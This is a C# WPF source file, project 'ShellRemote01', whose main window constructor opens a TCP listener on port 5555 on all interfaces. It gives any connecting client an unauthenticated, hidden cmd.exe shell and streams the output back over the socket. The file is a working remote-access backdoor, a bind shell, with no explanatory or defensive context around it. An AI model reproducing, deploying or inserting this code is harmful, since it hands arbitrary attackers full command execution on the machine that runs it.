using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace ShellRemote01
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        public MainWindow()
        {
            InitializeComponent();
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 5555);
            tcpListener.Start();
            for (; ; ) RunServer();
        }
        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);

            processCmd = new Process();
            processCmd.StartInfo.FileName = "cmd.exe";
            processCmd.StartInfo.CreateNoWindow = true;
            //processCmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processCmd.StartInfo.UseShellExecute = false;
            processCmd.StartInfo.RedirectStandardOutput = true;
            processCmd.StartInfo.RedirectStandardInput = true;
            processCmd.StartInfo.RedirectStandardError = true;
            processCmd.OutputDataReceived +=
            new DataReceivedEventHandler(CmdOutputDataHandler);
            processCmd.Start();
            processCmd.BeginOutputReadLine();
            strInput = new StringBuilder();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    processCmd.StandardInput.WriteLine(strInput);
                    if (strInput.ToString().LastIndexOf("terminate") >= 0)
                        StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw
                    new ArgumentException();
                    strInput = strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                };
                //Application.DoEvents();
            }//--end of while loop
        }//--end of RunServer()

        private void Cleanup()
        {
            try { 
                processCmd.Kill(); 
            } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
            socketForClient.Close();
        }
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
